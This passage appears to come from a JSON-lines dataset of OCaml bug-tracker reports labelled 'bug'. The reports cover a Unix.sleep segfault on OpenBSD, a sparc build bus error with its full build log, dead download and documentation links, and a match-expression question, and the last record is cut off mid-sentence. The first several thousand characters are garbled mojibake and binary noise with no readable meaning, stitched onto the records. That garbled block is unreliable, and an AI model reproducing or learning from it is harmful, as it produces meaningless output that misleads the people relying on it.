Ã¿ÃlÂ´ÃÃ¾Ã¯NÂ»ÃhÃ\u001bTÃ¿Â§\u0003Ã»Ã\u000bÃEâAÃ½\u001fÃÃ¿\u0011Ã$Â®Ã¿Ã³Â°Ã²iÃ¼Ã¹Ã¦Å¸Ãsâº5FË\u0001Â·~!Â½'Â¬Ã\u0019Ã¹Ã²\u0007ÃÃ\u001a?â¢Ã·9Â¯5Ã©\u000fÃ\u001eAÃ½\u001f+\u0015\nÃ¶*Å¸\u0002Ãy*\r,kÃ²twÃ·Ã¦Ã¦fÃ§BÂ¹\u001aÂªÂ·;ÂºqÂµÃ»WÃºÃºâÃ´Ã?N(ÃÃÃÂ½PÃÂ½ÃÃ®M?Ã¼ÃÂ¡\u0019$Tâ¬BÂ¢\nÃ\u0013Ã­Â¹ÅRÃÂ¯Ã¨\u0017Â¿Q{âÂ´\tÃ§P\u0000yÂ¾Vâ ÃhÃÃYÃ1ÃÃ»R\rÃ¦CÂ¶Ã§\u0012TÅ¸`SÂ·tMÃÂ³Ã¯{ÃÃÃ®Ã§+Ã¾â¢t?ËÃª\u0019nHÃ¾Ã£WÂ²Ã«Â±Â¯ÃxÃ\u0016<:ÃÃKÂ 2ÂµYâ¦âÃ­WÃd/?â\u00002NÃmmÂ¹Ã&\u0006Â¼Â¦âÃÅ¸\u000eÃ\u00015Ã°Ãâ°\u0014h\u0000â¢Ã°?Ã½\u0014ÃVÂ²Ã3Â·\r\u0015P\u0018ÃÃÅ ÃÂ§Ã¤) /*â¬zÃ¶ÃÂ©Ã¨?ÃRIu\u001aWÃLu\u0000\u0002BÂ¥Ã»>ÃÅ Â½Ã°)P\tÃ»ÅhmVÃSÂ \u001aÃÂ¨Â·~Â Ã¾ÂªÃ\u0001?v\n[?TÂ¿\u001bWÃÂ«\fÃzÂªÃ[kÃ~B\u0012&\u0011ÃÂ¹\u0013JÂ¸Â·\rÅ¸(HÃ¼Ã)ÃÃÂ¶:Â¦Ãµ\u001eWÃ«Ã SÃ©?lâ¬VÂ¯Â§\u0001>â¦\u0016\u0000?8B{.IÂªg4[;Lr!5kOÃâ\u001b5/\u0002\u0005ÃÂ ÃÂ­hcÃ?]?bÃ¶Â§Ã#\u001fÃ\f}â\u0011w3vÂ¿)\u001câ¬Â°ÃnÃ·\u0005ÂªÅ¾Ãâºâ¬F\u001eÃ¡P|Æ?fÃÅ¾\u0015\":\u0013â¹Â Ã«F\u0011ÃÂ­|\u0011ÃÃ?\u0013Â§WajÅ¸Â¥Ã±ÃnÂµÅ¡T{\u0006Ã¹~ zb\u0015Â§{ÃÅÅ ÃÃµÂ°Ã«\u001dÃ\u0010?Ã¸ÃÅ½Ãy\u0017\u0019]â¦ÃHÃÃ\u001eÂ³Ãª\u0015â¦A\fd\\âÂ¢Å¡â\nÃÃ«SÃ­R2Â±O#\u001bWÃ¬\u001eÃ§Ã¶ZÃÃ|Â¸Å½Â¾\u0013cÃÂ¢Â½âw?KÃ^Ao2\tÃN\bÃBFÃ¥qÃÃ¼â¢Â¼%ÃÂ¤HÂ»8Â±â¡Â¦Å¡5ovÂµÂ±AIÃÃ¯ÃÃ±Ãºâ3 iÂ²;ÅÃrÅ¡\u0003*\u000fÃ2OÃÃ_\u0015\u0011)FÃÃÅ)Ã±:Â¡ÃÃ*â°Â¨\u000b^ÃâÂ¨ImâvVwnÃ½AÂªâ?\u0010Â´Ãâ â°Ã§\u000bÅ¸+\tÂ«Ã»ÃGQÂªÂ´\u0004ÅÅ Vâ¬Â§\u001fÂªÃ\u0002\u001b\u0001?Â¿â¡â¬\u001c<x\u001bÃ3Â¡Â±lÂ³|{Ã¹\u0018Ã©Â£t\u001b\u0018Â¹Ã°.Â¤Ã¦Ã©{;%Ã/4\u001dgÂ¢ Ã±1\u0016Ã\u001erw?Â´âÃËÃ¸ÃÃN\u0019\roâ¹M#\u001eÃ¿7\u001dÃ½Ã¿6ÃÃ¿Ãµ\u001aÃÃ¿Ã­\u001aÅ¾Ã¿[â Ã¹Ã¥ORÃ\u0016\u0000Ã\u0003TÂ¨Â´Ã«Â³Ã£Ã¾SÃÃ­\u001b?Â®%yÂ§QâÃªÂµZcÂ·ÃÃÂ­u$Â¹Ã¹Â´Ã~ÃÃªHv%IG\u001f'Ãg<\n8Ãâ°.\nv-\u001b4Ã½N:ÃÃ¡\u0014\u0015.âÃ°ÃzÂº|\bÃ§rÃJÂ¨2Â¾Ã¥ÃÃÃâwLpÆ2\u0006Ã ;hâLâ¡7|uâ¡b\u0014IÃ¯ÃµÂ¦Ã\u001cC\u00129â4Ã¨\u0019âlÃºz(9GÂ·âÂ¤Ã¬Â¿pF\u001a)}â`oÃ©Å /\u00156ÃÃ£)Ã\u0003CÂ¼;Â¼|Ã®.\bVÂ¨#Ã§â¢W`Â£\u000eÃ±Ã¿â Ã´4RÂ¼Â«Â©jÃDNu??Ã«â¬Â¹âÃ§\u0019dÃ¡\u0003Â¶Ã¡Å½!dÂº|\u0004e&Ã³Ã\u0018Â¶Ã Ãâ|h=e8Â¼e!(\u0019âÃ\u0006]7ÃÂ¾Ã´%Ã¼Â¾\u0018Ã\u0018Â±Q'>YÃ´c?Â­7O!\u000bcÃ½â Â´Â³LÂ²u\u0003+Ã*Â¥=\u0013ÃÂ¥:]\u0015dHâÃÂ­QÃMÃ­Å¡tââÃXRâ:Å¡Ã¨â bÃÂ²ÃâÃÃn0âº?|Â¸EÃ³\u0005ÃZÂ£â°Â½\u0011\u00010Â¡ÃNâÃ¤ÃÃ;oâU*ÃÃ²'eÂ¯4Ã\u001bÃÃâ\u0014\u0012\u0004ÃÃ¬r3âÂªÃ§T&ÃÃ¥g\u0000Ã®âiÂ±Â¤Â ?\"J'Â¤EÂ½Â±dÃ¨Â¹QÃ´yÂ³Ã¶Â¨ÃºÂ¡Âº\u0015\u0016ÃµuhÃÃ$,nÂ¾\u001aÃbÃ·ÅN+mnÃ?ÂªÆ?$Â¸Ã\u0003Ã­\bÂ±ÃÂ¦ÃÃ¬ÅSÂ½\u0004Ã¶Å½ÃÃÂ¹?ÂºÃC\u0018uebNâ¡Ã\u000fHÃT,ÃvÅ \u001aÃ¶Ãen\u0003Ã\u0007\u001eÂ¯}ÃâÃ­Ã\u0017Âµ.ÃcË âºÂ°>@â¦Â¼lâ¡\r]Ã¡#CÃpjÃ3*Ã¬Ã£âºÃ¸Â´\u0003IE\u001fÃ±t\u0013ÃµEhÃ¼K?ÃªuÂ³â¦E{Ã½?Â¥\u0007Å¸x`Ãº?Z|ÂºÂ£âWÃÂ´vhÃ¸ÃÃÃ©XÃºÂ¸}Ã°q\u001fÃ¼lIâºPÃ¬\u0007 fÂ°7Elâ&`\tRh\u0007SoâÃp\u001f\u0003<~â¢ÃÂ¹ÃÃ·}Â©ÃºÃÃ-7WÃ¾Â°Å½Ã¼XÃâ¹\u0015Ã®Â¹Â¯^L\tÃÃ¦Â¹&Â©Â³\u0017T7\u0000ÃÃ?),ÃHÃ@\u001a.Â¼Ã«_2_dÃPÂ®Tsâ¡â¢Ã¸\u0014ZÃªF3ÃGdÃ\u0004ÃrJjÅÃÃÃ´Â´\u0007>C;ivi\u0012Ã»Ã¼#IâÃAâ\u0014Â¾Ãu|/Å¸.\u0001ÃÂ¶[Ãâ¢DTËYy\u0019Ã¬?Ã·ÃPÂ»Ã´5ÃâbÃ£zÂ¿x&â¦Ã '6Â¦ÅÃ·â¢_Ã¾Â¾RÃ}ÃÂ¤ÃÃ¢\u0006\u0016\u0013ÃÃ§.|rÂ¶Â¹Ã\u0017Â¿Â¤>%wÃ¿LÃ¨Ãâ?Â­\u001evHÃÃ®\u001aÃ»ÃÃ©kÂºÃ¾\u0004{;$*ÃÃ§\u001f<Ã(Ã\r\u000bÃ®gÂ¾MÃÂ«\u001fÂ¢Ã¿Ã­SlwÃÃ³?Liâ¢Â«\u0002;Å¡Â¶Â¶\u001eÂ«Â­/*jcÂº9`*ZÂ®\u0016Â Â£TWÂ¡5KGÃ¹â Â£Ã³Ã¦VÃ¡\u001eÃ«\u0003\u0007âWQ)Ã°Ã¹Â«Ãw?wBa\u0002ÃËÂ²8I\u0019\u0016Ã°)\u001ca|Ã5[ÅÂ¼\"\u001d_Ã\u0004yu\u0000>\u0003Ã@U\u0004^Â²Å \tÂ¼Â¦Ã\u0014xK+-$^Â¨Â¯`Ãâ¡Ã§_ÃÃºrâÃ¢h?Ã¹+\r:\u0007Ã­.lÃ#Â¬Â²ÃÃ\u000fÃ\u0000Â¿âÃ»Ã£ \u0000Ã¹Ã\u0016âÃ¨mâº$\u001c Âº=Ã»\u0014BNÅ¸\u000fÂ¼_\u0019Ã ;`ÃÃ~iÂ§ÃÃÃÃ¨ZÂ®Ã¿âÂ°Â½#Ã´;ABÃXÃµÂ¿â¦)â\u001e\u0015jâ¬{Ã¥\u000e$â°\u000ff'\u0003Â´Ã(3\u001aÃ²Å F yc`\u0014ÃÃ»\u000e6Â§ÃÃ·Å¾(8U\u0014_q-OR}Â¿âÃ¦Ãf2-5zÃ&Ã\u001aâºÂ­âºFrukjyÂ·Â£f^Ã$fÂ·\"ÃNÃ±Â´Ã¢Ã¬]Ã¼â°â°t\u001f\u0006PÃ«Â§\u001cÂµSÃ©Â Æ\f|}ÃÂ¡\rÅ¸â\u0017\u000fÃºÅ¡IÆ>s^Q]âOaÃ±Ã²SÃ\u0019Ã­DmâFË\u0016\u0001\u000f\u0004Ã¶^\fâ¢Ã±\u0007*Å¡3Â©F\rÃ¹Ã¼â¢Ã¬ââ ÃÂ²~+dÃ\t\u000bJÂºÂ¶Å½#Ã¿fc`\r$\u000fâÂ¾+Â¤\u0015Â¤Ã­\u0003?Â±&\u0011?Ã\"â¦feÃfÃ±<\u0005IÅ\"1\u0019Âµ$m\u0005Ã«Ã¦â¢?\u0016Ãâ¡â>â\u0019.gÃ¥Â¶â¢)Å½4HÂ¢IuhÆ\u0012ÃxÃªSbU)Ã°Pâº\u0000U\u001eI\n\u0005F[Â¤`Ã(R6ÅÃ0â¬AÂ«Ã¥Ã\u0016m1^%Ã\u001f\u0018â¬Ãº?IÂ©6YÃÃ¢Z\u0006\bÂ°Â¸v\u0018TÃÂ³Ë2Â±C Â¥Â¨ÃJÅ¸a=âÃÂ¦]Â¾\bÃ¯Å¾\u000eBÂ³Ã«Ã´\u0012I\nÃ´â\u00110Â¯\fÂ§z[Â¯N[/Â´Ã±Â ÃµhGÅÂ·Ã®IÃÂ¸?U\rÃÃ¼Â¬\"UÂ¤lsgEÃ4Â±9Ã¾Æ\u0012â¬xÃ¿\u0019Ã¢Ã6kRâÃºâ\u0016Ã\u0003Ã¢|ZÃ@â¢?\u0005Â±(eâÂ¸wg_jËgÃ°Ã¡Ãgâ¡Â¬ËÃºÃËÃµT\u001e\rÃ¯ÂªâqkÆpÃ_Ã·HÂ¯l;BtAÅN\fÃ¥^Ã4GÃ¹ÅÃ®â¦ÃÃ¹'Â­\u000fa?kÃMÃÃÂ¦\u0002B\u0012Ãº?ÃÃ]Â©9My\u0013âf\u001d\f/\u001cÃ©*}Ã¾Â¹Ã»âÂ£rÃ±Â³âºSOVÆyâ¦ËÂ»\nÃ¡ÃX$Ã\u000bÃ\u001atÃ¹<\bÂ¹wzg\\Ã?Ã\u000bÂ¹â¡Ã¬{Ã¸\f2Å¾\u0018\u0017+Ã¤Ãâº9Â¨ÃªÃ¦>Ã¥Â²D?\\lÃxÂ¸?Ã'pÃ6eÃaÃâÂ³(Â¯?Â¹â¦â¹ZÃâ\fÂ¤Ã³)cfÃ¨(\u0007\u0019;k&q\u001czÃ¦\n{â ~b&\u0002Â¶*Ã\u0015Ã8Â§ÃºNOÅ¸ÃÂºâ\u001dÃÂ¼Ã¤ÃSLÂ²|f\u0012Ã¢\u0017Ã+\u0012Ã¦Â§hfÃS\u001b\u0011\\Å¸Ã?âââ\u0002Ã}Ã¬Â¡7\u0002>âV$ÃÃâÃ¨ÃÃ©FÃ¬7\bfÂ»Ã¼Ëâ¡\rÃ36âV\u0015:[Â 6\u0003\u001d?\fâÃ®?:\u001cv/ucÂ¤Ã²â¢XÃ¨Ã\t=Ãâ9P\"Â°{Â¾?\u0007o\u0016|ÃÃ§\u001dkÃÃÃªÂ¤1Â·Â¥7ÃgÃÃ¢Jââ=âÅ¾âvÃÃ´4\u0014HCF\u001a\u0015A2Â¨mÃfÃÂ¡Ã²QCËâ¹Â®tÃL@Â¥ÃlqÃÃ\tÃ¢Ãe\u0017ÃÂ¡Ã]\t`âºÂ·,\u0000Wâ¢X?Ãª\u0017:24&Â Ã²ÅÂ´âÃ®âÃÃÃ¢ÂºYl\u0017\u0013Ã¥Ã©Â¬TtÂ¶wÃ¡J\u0012!IÂ¦\u001e\"\u0016veÃ¦Â¤2Â¬[\u001bÃâ,ÃÂºÂ»Â°Â±dÃ\u0015wÂ©&?e3$\u001e%L\u001a#(b>â.Â¦â\u0013?Â¯EY$Ã´Ãu.t\u0017)SKË/\u0013Â©QÃGfâ\u00007Å 1â \u000eGâ¹d?\u0010VÃ¿Ã*\u000eÃâÂ¢#ÃtâÂ¸\u000e\u0010ÃÃ¸Â¡\r_\u0011Z\u001dÃ\u0012yÂ²Ã±R9hâ°Sâ¢ÃÃ¾3ÃÅ¸\r-I6\u0002\u00026ÃÃ¥ÃywÃ½LÃ¾TÃ \nÂ¹Ãâ¬/Ã¢\r0ÃguÃ®\u0017\u001aâDÃ¬Ã¸Ã£\u001cÂ¬Ã­\u001d6PÃ]ÃÃâÃ¡?\u000fÂ³Â´?Â (Ã§Â°ÃÃOÅ½p30Ã¡Ã±M?\u0002Ã±\u000fÃ©ÅLÃÂ¬\fAÂ²pÃU?j ÃÂ°Ã§)Â¿\u0010Ã>vÃÅ¾Å¸âÂ¡ÃâÂ£xÂ´Â¶Ã¸Ã¶\u0011Ã2Â¬\u0006ÃÅ¡âÂ½\u000fÅ¡â¡}(m0\nÃVÃ¿yWÂ·EÂ°Ãâ\u001dÃ\u0014Å D\u0002Âº}ÃA\u001ebÃµ|&s\u000fÂ¬Ã¾x\u0005ÃºÂ¥A)jQ<\u001fÂ¤ÃÂª\u0014?EÂ±ÃÂ©ÃÂ¯POÃ©Ãk5PgbÃJnÃ21Xrâ¦2EV%;RÃ£Ã®*ââ(Â¼ÃºÂ¸(ÃÃ_\u0018Z{tâÃ¸?#^Â´+1Â²\u000eÃ©Â¾Ã.Ã3ZdM\nÃ±.z?;\\Y\u0010Â¨ÃÃ«3Eâ¢Å Å¾\u000eÂ³Ã¥Â²TnS\u0002Ãâ}<ââ¬Ã\u0002-Ã­Â©w\bÃµ,Ã#+ÆÃ ÃÃ'Â¼kÃ\"gÃ£Ãr\u001bq:ÃÃÃÃÃ²ÃÂ²\u0005.N=(CGâ¬\rÃZÂ°â.mÃ\u0001\u000bÂ¿\"Ã¨\nÂ¥\u0017l#l?Ã\u0002Ã?Yp7ââ4â\u0016ÃÂ­z\u000f\u001bH?rÃ¦Å½r?\u000eH\nhÂ¬â¦\u0011\u0018ÂºÃ.Â¶\u0017Â¼ÃÃ²P\u001aVÃ¡|Â¹<Â©ÃÃ­Ã»H\u000bÂ¬t~\fÃâÂ«=PÃ«vI\"Ãª?Ã¶Ã<â¡Â¡iÃªÃV@\u0010kÅ¸Â½\u000bÂ«Â¶Ã£ÃKÅ<Ã1\u000f\u0011Â¤Å?1Ã£â¢â¦=?Ãw;Â°Â§Â Ã¬â]N*Å \u0007!ÂªÂ·\\\u001eLb\u001fb\u0013âÅ¾Ã£%4IÃ§Â°â¢,Â©rEÅÃ¨4Â¹â¡Ã\u0014Ã¹Â·?D}\nÃ³Å¸Ã[qâ¢Â°?-â°Ã\u0005ÃÃ\fÃÃ~C3dÃâ¢Â£ÃË\u001dfÂ¶Â·Â·Â¥Â¯Â¥CÃ©D:âÅ½Â¤\u0017Ã´9Ã?ÃÂ½Â 0&\"6â¬cfËÃ¿Ã1G\"\u000fbâ¹âÃ¹ÃÂ¿pÅ½'ÃÂ¼[Â±GÃg\rÂ¶Â«\u0017|â*\u000eÂ p;\u001eQo ,Â²?Â¸âÂ³Â¹lÂµ1Ã\u001d?Å¡â¡Ã³ÂµeÃ°Â²\u001cP<â¦Z\u000bÃÃÃ°Å¾Â½Ãº)[\r\u0017ÃÃ²\u0005rÃºÃ]\u0015Ã§?ÃÂ¥Ãº^!âÆâ$ÃV!j0Ã°?!Â¨ÃZÃ¬Â»g(Â³Â Ã\u001f>kÃ°\u0005ÃÂ \u0017\u0016Å¡xiEzÂ¡Ã¸â¹Ã¸hâ¹>âÃ¹Â Ã6%ÃÃ\nâºÃÅ¡\u000e!Â·$;\u0018Å¸!\u0004â¢ÃÃ¶\u0001Â§Ã\u0002X\f.ÃRsÃ´Ã®ÃÃÃ»wd2Å¡Å¡NÂ¹Å¾Â²Â¼ÆTÃªâÂ°\u0007}7â¹Q\u0012\u001dÃ»+C\n"},{"labels":["bug"],"text":"**Original bug ID:** 1686\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nBonjour, \n\nj'ai un problÃ¨me pour endormir un process. Dans\ncertain cas, l'expression \"Unix.sleep\" fonctionne,\ndans d'autre cas, je suis obligÃ© de crÃ©er un thread\nqui exÃ©cute uniquement \"Unix.sleep\" et d'attendre ce\nthread (Thread.join ) pour faire la mÃªme chose.\n\nSystÃ¨me d'exploitation : OpenBSD 3.3\nOcaml 3.06\n\nje vous envoie en piÃ¨ce jointe le projet sur lequel je\ntravail (projet libre)\n\nle sous rÃ©pertoire src/ contient les sources du projet\nle sous rÃ©pertoire test/ contient des fichiers de\ntest.\n\nle fichier qui plante est le fichier src/camelog.ml\nLe fichier main.ml appelle (Ã  la ligne 27)la mÃ©thode\n\"run\" de l'objet camelog.\n\nle fichier camelog.ml contient une mÃ©thode \"sleep\"\npour endormir le processus.\n\ncompilation :\n\ngmake -f Makefile_ocaml.tpl\nou\nmake all\n\n\n\nDans le rÃ©pertoire src/ la commande :\n \n ./a.out ../test/test6 \n\nplante le programme : \"segmentation faut\"\n\nil semble que dÃ©commentant la crÃ©ation de threads\n(method  alarm_handle sign, fichier camelog ligne 100)\nou en crÃ©ant un thread dans la mÃ©thod sleep du fichier\ncamelog alors la fonctionnalitÃ©  \"sleep\" fonctionne.\n\nAvec ocamldebug, j'ai notÃ© que c'est chaque appelle Ã \nla mÃ©thode 'Unix.sleep' (en l'absence de thread) qui\nfait planter le programme.\n\nCe serait peut Ãªtre un dÃ©faut dans mon programme, mais\nle fait que ce soit lier Ã  la prÃ©sence ou non de\nthread m'a insiter Ã  vous reporter ce bug.\n\n\nMerci de me mettre au courant de vos observations sur\nce problÃ¨me.\n\nCordialement\n\nCorentin Jechoux\n\n\n\n\n\n\n___________________________________________________________\nDo You Yahoo!? -- Une adresse @yahoo.fr gratuite et en franÃ§ais !\nYahoo! Mail : http://fr.mail.yahoo.com\n"},{"labels":["bug"],"text":"**Original bug ID:** 1683\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Parizet xavier\nVersion: Camllight 0.74\nOS: PC under Windows XP\nSubmission from: dyn-195-242-90-46.ppp.tiscali.fr (195.242.90.46)\n\n\nWhen I click on the link to upload Caml-light, an mistake'page appear so I\ncant't upload it...\n"},{"labels":["bug"],"text":"**Original bug ID:** 1682\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Matthew Kennedy\nVersion: 3.06\nOS: Gentoo GNU/Linux \nSubmission from: sl-opus-1-0.sprintlink.net (144.232.218.142)\n\n\n\nHi I ran into the folowing build error on a Gentoo GNU/Linux sparc platform. \nThe details are:\n\nsys-libs/glibc-2.3.1-r4\nsys-devel/binutils-2.13.90.0.18-r1\nsys-devel/gcc-3.2.2-r2\n\nLinux gentoo 2.4.20-sparc-r8 #5 SMP Mon Apr 28 23:13:45 CDT 2003 sparc64 sun4u\nTI UltraSparc IIi GN\n\nI'm happy to provide any further details you request.\n\nMatt\n\n\nBUILD ERROR (complete build log at\nhttp://cvs.gentoo.org/~mkennedy/ocaml-3.06-build.log)\n-----------\n\nmake[1]: Leaving directory `/home/mkennedy/ocaml-3.06/stdlib'\nboot/ocamlrun boot/ocamlc -nostdlib -I boot -warn-error A -I utils -I parsing -I\ntyping -I bytecom -I asmcomp -I driver -I toplevel -c toplevel/genprintval.mli\nboot/ocamlrun boot/ocamlc -nostdlib -I boot -warn-error A -I utils -I parsing -I\ntyping -I bytecom -I asmcomp -I driver -I toplevel -c toplevel/genprintval.ml\nboot/ocamlrun boot/ocamlc -nostdlib -I boot -warn-error A -I utils -I parsing -I\ntyping -I bytecom -I asmcomp -I driver -I toplevel -c toplevel/toploop.mli\nboot/ocamlrun boot/ocamlc -nostdlib -I boot -warn-error A -I utils -I parsing -I\ntyping -I bytecom -I asmcomp -I driver -I toplevel -c toplevel/toploop.ml\nboot/ocamlrun boot/ocamlc -nostdlib -I boot -warn-error A -I utils -I parsing -I\ntyping -I bytecom -I asmcomp -I driver -I toplevel -c toplevel/trace.mli\nboot/ocamlrun boot/ocamlc -nostdlib -I boot -warn-error A -I utils -I parsing -I\ntyping -I bytecom -I asmcomp -I driver -I toplevel -c toplevel/trace.ml\nboot/ocamlrun boot/ocamlc -nostdlib -I boot -warn-error A -I utils -I parsing -I\ntyping -I bytecom -I asmcomp -I driver -I toplevel -c toplevel/topdirs.mli\nboot/ocamlrun boot/ocamlc -nostdlib -I boot -warn-error A -I utils -I parsing -I\ntyping -I bytecom -I asmcomp -I driver -I toplevel -c toplevel/topdirs.ml\nboot/ocamlrun boot/ocamlc -nostdlib -I boot -warn-error A -I utils -I parsing -I\ntyping -I bytecom -I asmcomp -I driver -I toplevel -c toplevel/topmain.mli\nboot/ocamlrun boot/ocamlc -nostdlib -I boot -warn-error A -I utils -I parsing -I\ntyping -I bytecom -I asmcomp -I driver -I toplevel -c toplevel/topmain.ml\nboot/ocamlrun boot/ocamlc -nostdlib -I boot -a -o toplevel/toplevellib.cma\nutils/misc.cmo utils/tb cmo utils/config.cmo utils/clflags.cmo\nutils/terminfo.cmo utils/ccomp.cmo utils/warnings.cmo parsi /linenum.cmo\nparsing/location.cmo parsing/longident.cmo parsing/syntaxerr.cmo\nparsing/parser.cmo p sing/lexer.cmo parsing/parse.cmo parsing/printast.cmo\ntyping/ident.cmo typing/path.cmo typing/prim ive.cmo typing/types.cmo\ntyping/btype.cmo typing/oprint.cmo typing/subst.cmo typing/predef.cmo typ\ng/datarepr.cmo typing/env.cmo typing/typedtree.cmo typing/ctype.cmo\ntyping/printtyp.cmo typing/inc declass.cmo typing/mtype.cmo\ntyping/includecore.cmo typing/includemod.cmo typing/parmatch.cmo typi\n/typetexp.cmo typing/typecore.cmo typing/typedecl.cmo typing/typeclass.cmo\ntyping/typemod.cmo byte mp/lambda.cmo bytecomp/printlambda.cmo\nbytecomp/typeopt.cmo bytecomp/switch.cmo bytecomp/matching. o\nbytecomp/translobj.cmo bytecomp/translcore.cmo bytecomp/translclass.cmo\nbytecomp/translmod.cmo b ecomp/simplif.cmo bytecomp/runtimedef.cmo\nbytecomp/meta.cmo bytecomp/instruct.cmo bytecomp/bytegen mo\nbytecomp/printinstr.cmo bytecomp/opcodes.cmo bytecomp/emitcode.cmo\nbytecomp/bytesections.cmo by comp/dll.cmo bytecomp/symtable.cmo\nbytecomp/bytelink.cmo bytecomp/bytelibrarian.cmo bytecomp/bytep kager.cmo\ndriver/pparse.cmo driver/errors.cmo driver/compile.cmo toplevel/genprintval.cmo\ntoplevel oploop.cmo toplevel/trace.cmo toplevel/topdirs.cmo\ntoplevel/topmain.cmo\nboot/ocamlrun boot/ocamlc -nostdlib -I boot -warn-error A -I utils -I parsing -I\ntyping -I bytecom -I asmcomp -I driver -I toplevel -c toplevel/topstart.ml\nboot/ocamlrun boot/ocamlc -nostdlib -I boot -warn-error A -I utils -I parsing -I\ntyping -I bytecom -I asmcomp -I driver -I toplevel -c toplevel/expunge.ml\nboot/ocamlrun boot/ocamlc -nostdlib -I boot  -o expunge utils/misc.cmo\nutils/tbl.cmo utils/config. o utils/clflags.cmo typing/ident.cmo typing/path.cmo\ntyping/types.cmo typing/btype.cmo typing/pred .cmo bytecomp/runtimedef.cmo\nbytecomp/bytesections.cmo bytecomp/dll.cmo bytecomp/symtable.cmo topl\nel/expunge.cmo\nboot/ocamlrun boot/ocamlc -nostdlib -I boot  -linkall -o ocaml.tmp\ntoplevel/toplevellib.cma toplev /topstart.cmo\nmake: *** [ocaml] Bus error\n\nCONFIGURATION:\n-------------\n\nmkennedy@gentoo ocaml-3.06 $ ./configure\nConfiguring for a sparc64-unknown-linux-gnu ...\ngcc found\nThe C compiler is ANSI-compliant.\nChecking the sizes of integers and pointers...\nOK, this is a regular 32 bit architecture.\n64-bit \"long long\" integer type found (printf with \"%ll\").\nThis is a big-endian architecture.\nDoubles can be word-aligned.\n64-bit integers must be doubleword-aligned.\nNative division and modulus have round-towards-zero semantics, will use them.\nDynamic loading of shared libraries is supported.\nranlib found\n#! appears to work in shell scripts\nPOSIX signal handling found.\nstrerror() found.\ntimes() found.\ntermcap functions found (with libraries '-lcurses')\nYou have BSD sockets.\nsocklen_t is defined in <sys/socket.h>\ninet_aton() found.\nunistd.h found.\noff_t is defined in <sys/types.h>\ndirent.h found.\nrewinddir() found.\nlockf() found.\nmkfifo() found.\ngetcwd() found.\ngetwd() found.\ngetpriority() found.\nutime() found.\nutimes() found.\ndup2() found.\nfchmod() found.\ntruncate() found.\nsys/select.h found.\nselect() found.\nsymlink() found.\nwaitpid() found.\nwait4() found.\ngetgroups() found.\nPOSIX termios found.\nsetitimer() found.\ngethostname() found.\nuname() found.\ngettimeofday() found.\nmktime() found.\nsetsid() found.\nputenv() found.\nsetlocale() and <locale.h> found.\ndlopen() found.\nmmap() found.\ngethostbyname_r() found (with 6 arguments).\ngethostbyaddr_r() found (with 8 arguments).\nReplay debugger supported.\nCannot detect system stack overflow.\nThreads library supported (using bytecode-level scheduling).\nX11 not found, the \"graph\" library will not be supported.\nNDBM found (in /usr/include)\nConfiguring LablTk...\nX11 not found.\nConfiguration failed, LablTk will not be built.\n\n** Configuration summary **\n\nDirectories where Objective Caml will be installed:\n        binaries.................. /usr/local/bin\n        standard library.......... /usr/local/lib/ocaml\n        manual pages.............. /usr/local/man (with extension .1)\nConfiguration for the bytecode compiler:\n        C compiler used........... gcc\n        options for compiling..... -fno-defer-pop -Wall -Wno-unused\n-D_FILE_OFFSET_BITS=64\n        options for linking.......  -Wl,-E  -lm -ldl -lcurses \n        shared libraries are supported\n        options for compiling..... -fPIC -fno-defer-pop -Wall -Wno-unused\n-D_FILE_OFFSET_BITS=64\n        command for building...... gcc -shared -o lib.so -Wl,-rpath,/a/path\nobjs\nConfiguration for the native-code compiler:\n        (not supported on this platform)\nSource-level replay debugger: supported\nAdditional libraries supported:\n        unix str num dynlink bigarray threads dbm\nConfiguration for the \"num\" library:\n        target architecture ...... C\nConfiguration for the \"graph\" library:\n        options for compiling .... \n        options for linking ...... not found\nThe \"labltk\" library: not found\n"},{"labels":["bug"],"text":"**Original bug ID:** 1681\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Daniel Weil\nVersion: 3.06\nOS: Windows, Linux\nSubmission from: pat-aty.gre.completel.fr (213.30.140.146)\n\n\nThe site ftp://ftp.inria.fr/lang/caml-light/bazar-ocaml/ is not available, so\nit's been impossible to download CamlIDl since several weeks now. The page seems\nnot to exist any more.\n\nSo I tried to get a version from the CVS server. I did but it does not compile,\nand I get the message :\n  ocamlc -g -c utils.mli\n  File \"utils.mli\", line 17, characters 29-65:\n  The type constructor format expects 3 argument(s)\nwhen I type \"make all\"\n\nIs the CVS server up-to-date ?\n\nDaniel Weil\n"},{"labels":["bug"],"text":"**Original bug ID:** 1679\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Anton Moscal\nVersion: 3.06\nOS: Linux\nSubmission from: ts1-a25.spb.dial.rol.ru (195.190.98.25)\n\n\nOn http://caml.inria.fr/ocaml/htmlman/index.html\nlinks to bundled docs doesn't work.\n"},{"labels":["bug"],"text":"**Original bug ID:** 1678\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nHi all,\n   Maybe my imagination is too limited here.  But I can't think of any\nreason why replacing the first expression with the second expression\nshould cause my program to segfault.\n\nmatch sync_framerate with\n     _ -> ();\n\nmatch sync_framerate with\n     _ -> ()\n   | _ -> (); \n\n\nI'm working on a mixed c++/caml class project.  It's a bit annoying to\ncompile (requires ocamlgsl).  But if you untar this, it has a bytecode\nexecutabe already built at \"gawalker/caml_src/a.out\".\n\nhttp://www.ffh.us/ryan/temp/gawalker.tgz\n\nWhat I *want* to do is have an boolean optional argument to the function\n\"runworld\".  Thus:\n\n let runworld \t\n   ?(sync_framerate)\t\n   ?(draw=true) ?(plot=false) ?(ticks= -1)\n   ?(closewin=true)\t\t\n   walker display  =  ...\t\n\nThen, if the sync_framerate argument is supplied I want to set a global\nvariable to its contents.\n\n   match sync_framerate with \n       None -> ()\n     | Some b -> compensate_framerate 